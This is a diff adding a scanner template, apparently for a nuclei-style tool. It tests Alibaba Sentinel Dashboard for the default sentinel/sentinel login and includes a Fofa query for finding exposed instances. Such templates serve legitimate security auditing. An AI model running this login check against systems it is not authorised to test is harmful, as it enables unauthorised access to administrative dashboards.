@@ -1,0 +1,29 @@
+id: alibaba-sentinel-default-user
+
+info:
+  name: Alibaba Sentinel 默认用户
+  author: zan8in
+  severity: high
+  description: |
+    Fofa: app="Sentinel-Dashboard"
+  tags: alibaba,sentinel,default-user
+flow: |
+  http("r0")
+
+http:
+  - id: "r0"
+    raw:
+      - |
+        POST /auth/login?password=sentinel&username=sentinel HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Basic Og==
+        Content-Type: application/x-www-form-urlencoded
+
+        
+
+    matchers:
+      - type: dsl
+        dsl:
+          - contains(body,"\"success\":true") && contains(body,"\"code\":0") && contains(body,"\"msg\":\"success\"")
+        condition: and
+
